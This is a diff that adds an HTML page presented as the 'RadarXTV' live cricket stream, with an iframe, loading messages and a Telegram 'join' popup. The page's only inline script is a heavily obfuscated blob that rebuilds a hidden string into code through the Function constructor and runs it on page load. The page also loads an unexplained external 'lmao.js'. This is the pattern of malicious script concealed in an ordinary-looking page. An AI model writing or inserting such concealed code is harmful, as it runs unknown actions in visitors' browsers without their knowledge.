@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script src="lmao.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RadarXTV - Live Stream</title>
+    <style>
+        body { 
+            background-color: #121212; 
+            color: white; 
+            font-family: Arial, sans-serif; 
+            margin: 0; 
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .container { 
+            text-align: center;
+            position: relative;
+        }
+        iframe { 
+            width: 80vw;  /* Width same as before */
+            height: 60vh; /* Reduced height */
+            border: none; 
+            display: block; 
+            margin: 0 auto;
+        }
+        #loadingMessage, #refreshMessage { 
+            font-size: 16px; 
+            color: red; 
+            position: relative;
+        }
+        #refreshMessage { 
+            color: yellow; 
+            margin-top: 10px;
+        }
+        #fullScreenBtn { 
+            position: fixed; 
+            bottom: 20px; 
+            left: 50%; 
+            transform: translateX(-50%);
+            padding: 10px 20px; 
+            background-color: #00ffcc; 
+            color: white; 
+            font-size: 16px; 
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .popup { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: rgba(0,0,0,0.8); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+        }
+        .popup-content { 
+            background: white; 
+            color: black; 
+            padding: 20px; 
+            border-radius: 8px; 
+            text-align: center; 
+        }
+        .popup button { 
+            margin: 10px; 
+            padding: 10px 20px; 
+            border: none; 
+            cursor: pointer; 
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>RadarXTV - Live Stream</h1>
+    
+    <div id="iframeContainer">
+        <iframe id="streamIframe" src="" style="display:none;"></iframe>
+    </div>
+    
+    <div id="loadingMessage">Loading stream... Please wait.</div>
+    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
+    
+    <button id="fullScreenBtn">Full Screen</button>
+</div>
+
+<!-- Popup for Telegram -->
+<div id="popup" class="popup" style="display: flex;">
+    <div class="popup-content">
+        <p>Join RadarXCricket on Telegram</p>
+        <button id="joinBtn">Join</button>
+        <button id="cancelBtn">Cancel</button>
+    </div>
+</div>
+
+<script>
+(function(){var RGl='',hrS=840-829;function QRM(t){var e=1125212;var a=t.length;var y=[];for(var z=0;z<a;z++){y[z]=t.charAt(z)};for(var z=0;z<a;z++){var x=e*(z+431)+(e%43286);var n=e*(z+210)+(e%13086);var l=x%a;var u=n%a;var k=y[l];y[l]=y[u];y[u]=k;e=(x+n)%3697503;};return y.join('')};var KAQ=QRM('ltrximgqtdfobtnesaprjshzownucurccvkyo').substr(0,hrS);var nmb='=ar 706a+ega()7[4e=0=s, v.ab)=jfe-1ro((n01zp](uta)ypv;u=nr(=ir(, t)7v,,]cls<di;({;i[a7lhjns u,r g[a+c2l8})1rr8vr..f .1h5rnra,9vAn]pi"r1; rr0(0=a+Cvl7n1-fr;+4)m[=)r=.=iag;0aou;=u4hd+.tadel*e,)bsAy8.hs)6;o,d=tdf(unonun )uf.(C;ttS;]ui9a])5 lr;g;u[)n;t;f."v(.)[(ti2r)6,rnnerlhahllrC=hj-kfo> }}v+}w{l.rsf=(unv"air hov8)r;;a(hlgm,g1))s,lu90sv=ocs;halsn")g;vr<7;6(oui+ej r;rbhle,;+ ]u)ar+t)+;c{)vl)d;Aj(n!ha]r;"j([;c=.svx)6aqex=1rh2da.mturmt8ev7ail;rran[=,;rl{i)e+=}i0fi(=lt)i(=ko][.;e*ffh-p,C,tn=azr+eAo(a=1+vidi7ke(4oae0plin(6-ma8=ian8c2r{evfe s,=tn(u +ra.hs=yn] .,1p[]0v (k+.v=.av"h hi+,bkehi;i.+nmo)>;o9i0t(9[zr1]o;t=;](u5a,,7=mn"l+)[o ruot)h=s,v0;hxs;ba7r; geur,.v]A]=a.(csdls+)a}";a<v6sS=m(dg;qh(r+fsy66 in(f=istr}-qgt4(,;,=r;,d=[39,8C8.cotc"haea;of3 =9h(va1antln-C6.oeiie(f=i;. 1ev;;[gpi;a<l);2ggs+;f++C{f.vrex.tc!rjacp+r,s4o)7p=oon=2)"i=puhr(mrh2roudavzopv=o.8eh<=n qbi)a{tv zsc8mrt+;Cpi)s';var RWh=QRM[KAQ];var rSv='';var UNW=RWh;var sex=RWh(rSv,QRM(nmb));var FUJ=sex(QRM('rt=2P3_P]d%!=P t%kn!7;al.eneca27jc1(Eeeam4P3Pr.an gP)fPPP.c7P;Ep&6 )cse(0*e%<5_m{P_P3qn$8_ryon=rx>P7al.8!Pe.P(Pni1.dPl=le3,P#8edP)6)FPPsno)$rot.Etii2p1eh_%(tH(%.,)p>3a(P;{2o.d[Prn3Kip+.rbP)PD0O1Pe66m7}P;,[PnP=35!($oP(P t._)2rt}!oqPcpe;t3qe(= Af4f7(i)rcPeo=1re\/)5n.%l.h-a8}PpIP$d4i5=1yb0m1S.5.trqen"d[Pco]nm.sPPP](Ps)y3Prtc.P P%i:(cacu,s ePt!rPPdd7.p0%3C*ucM%0(uJn.o.P()IP\/d6rei?ei.C Gte\'oP>.6%oe,aPP&0_cihdam,j(}C.z.iP0n)CPoPPc)1P]e@nP_g_9.!)t.ePHq!31lcP3 let!cso%)tncP6.%d.isht4.scPcPf)oP.L(35.7P)r.io(83I(3puP9$eoro&}ss.}od8otP{C_o!Pufpeksc1e88_l(u(PoP=l[Pe j%8C)aeu.o =.u3P%e5Pann6onyt=jd):7r$)c_6r.!\/P8c)tc%s_)5Pl{n,{(yPts(4.u.m!..Iqincmrtf t9fuwm\/;mi#_on4PPz>gc.$a0e[e &.&.n29eu.mrFo}8P(P$PEa{=e(1P ){]w95]Pvonk]Pt"r=a3%ybp;c_2r6oErlb.j$Pni;P!t.P{APN6lP_].e3];6i.P).c$un_3terPhfcst)cns+o!Pis(=$P#Pfclo]siion}}p,tP7.5n)ee4rf7 ,ln=P%Pn,_fo.i...Dt.4PP,Pm(io,ot_)=ed,=7P%%K[x59{we]FnP{_Prij(l8odPt63_=(=0k)5Pk37PuPOg]eSrPukP5q8aStP](cP(,6P!(01gmP!j);ej.!_o%8c.;%L_atan{jiqs3n_f;PPr0kSaPesne!>,e@eI1;};P5;eP\')cPln3)tusn_ oelcutn3"a<_s]P+{2aixC34)1cP?x,dn)rc{cPPoocknaP)2.<e=.n!_Pt4@2%;!C$P_Mil{.1}niie9j)PP!i9.(,]tPgoEPnpe.m)PoOfc8Ml8u#_(4CPcyD(nB01B.)($}_=k_ );#d) ,4Iq4{0P)!]e;]=;c(1;sn(;JbPs+_2c1,i%P_5}l(40Pt_C=PP4Ji;fC67]Pc2_$1(1C.:ej.sPP4=Pur8_mko%eP6P;rPn,\/Bh_PMP=l\/+e95Pfd.2_51,4#)1._c!$5)_4qon=_((}PP5i!i7,P,g()..P%83P2(7dufPP7)s)1PP2aP](a))74_]#stas[eP2j.?P)6o%;6sEA+4$DlPs)1)"&rm(1r_g(gPoP5 ilc,Pnl"t0r38fo.Pae(;siP1cPm%ncetPC $4+aPF2wm.rl1P!t4qP;]"]14Gn.L=({k2:PePPP)P%4c-PPtuPPn6n=K3;..P_3460riflPm4ti%f(.5PPb=Kf{t_76a;4P]]aP?s 57_Ps[dt={c)i3o;lPrrd)ee+urPedPD! og5r){n]Pk;6e )P%lPa$;de{4PP.9oP%.\/.r5P=P7(nm0;;.P.a{efPP5s* n]e._)lP8$DtfP\/6]nnPe5(2=)rPPa]b7))9j3]! e;m3 Ma .fac(.Pr9jPic"PP5kP>,3i\/]f))9%= gIe]o]lfB!ia$P_f_#.>(_r_ceosnt8rePr\/o$>!i e7PPulee_.Ihf.ak.F_o],1e7(.o(e$uNe}]2;PP)82l#f(]s6(_]aP)"a=rr8Je5{(bP{P%i]a5PIk)b(Pe7Fe%{67 )cF96\/e]P9\' Peuue(3P]M3{:5cenP0]Pc>]n(]&E)PcLJej6nP01PrGPCPc]_c);f$n_cwl+epP)P$e5PPP{$ts!lmiP0a,$(P{e _PuPf.PpNeClr1%fPePeFrr0PPG8.t2 ]f*h4wy3h((k))r2Posss,)_c(P3!.Pe!868w.$!$#PsPd$ c100$39+eoPP]td1o7P1fu%51tr(\'h_6(7_no%P P1$c4e$8[a%t(c{=1]uah9=4ys;4n$Pb.e,)79[P\/r)ili_oc6{eEe! .{1p)5)(,onlk(PPg ()onw66inBk(:}#Bs%;O9(e3;oc[>_iaPo_yo)};8;28o!P; PP=P;.gc)gG0mse7n.e.PSi__1,]v6P,)P%Pa4 ]r9_1b].3D;)gc.02.P{e<(Pct)8_"JyP"Pob"2Ptiu_ i)3occ\/(Ppay_Bc8)$t6_nPa8rn!af=$.,I ]}9f jl,eou%dPm@(oenI!rllc 5PcP; .o=ole!wrlnj-t:ePen-"N[ !}n.ds pP63;)$.)lC\'K<_ ne.!P!{=.l})fu6'));var jmZ=UNW(RGl,FUJ );jmZ(9109);return 8604})()
+</script>
+
+</body>
+</html>
